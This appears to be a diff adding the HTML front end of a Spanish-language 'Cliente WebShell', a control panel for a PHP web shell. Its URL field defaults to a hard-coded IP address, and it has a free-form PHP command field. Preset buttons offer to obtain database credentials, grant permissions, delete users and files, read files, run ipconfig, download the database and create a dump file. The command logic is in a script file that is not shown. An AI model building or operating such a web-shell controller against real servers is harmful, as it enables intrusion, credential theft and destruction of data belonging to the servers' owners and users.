@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Cliente WebShell</title>
+        <link rel="stylesheet" href="style.css" />
+        <link href="https://fonts.cdnfonts.com/css/euclid-circular-b" rel="stylesheet" rel="preload" as="style" />
+        <script src="script.js" defer></script>
+    </head>
+    <body>
+        <h1>Cliente WebShell</h1>
+
+        <div class="container">
+            <div class="left">
+                <div class="input-container">
+                    <input class="text-input" type="text" id="url" value="https://147.189.173.114/web/" placeholder="Url de la página" />
+                    <input class="text-input" type="text" id="command" placeholder="Introducir comando PHP" />
+                    <button class="submit-button button" id="submit" onclick="makeRequest()">Ejecutar comando</button>
+                </div>
+                <h2>Salida</h2>
+                <pre class="output" id="output"></pre>
+            </div>
+
+            <div class="right">
+                <h2>Comandos preestablecidos</h2>
+                <div class="presets-container">
+                    <button class="preset-button button" onclick="getCredentials()">Obtener credenciales de la DB</button>
+                    <button class="preset-button button" onclick="getPermissions()">Otorgar permisos de la DB</button>
+                    <button class="preset-button button" onclick="getUsers()">Mostrar usuarios de la DB</button>
+                    <button class="preset-button button" onclick="getDatabases()">Mostrar bases de datos</button>
+                    <button class="preset-button button" onclick="getTables()">Mostrar tablas</button>
+                    <button class="preset-button button" onclick="deleteUser()">Eliminar usuario de la DB</button>
+                    <button class="preset-button button" onclick="getIpConfig()">Obtener ipconfig</button>
+                    <button class="preset-button button" onclick="showDir()">Ver carpeta</button>
+                    <button class="preset-button button" onclick="readFile()">Leer archivo</button>
+                    <button class="preset-button button" onclick="createFile()">Crear archivo</button>
+                    <button class="preset-button button" onclick="deleteFile()">Borrar archivo</button>
+                    <button class="preset-button button" onclick="downloadDatabase()">Descargar base de datos</button>
+                    <button class="preset-button button" onclick="createDumperFile()">Crear archivo de dumpeo</button>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
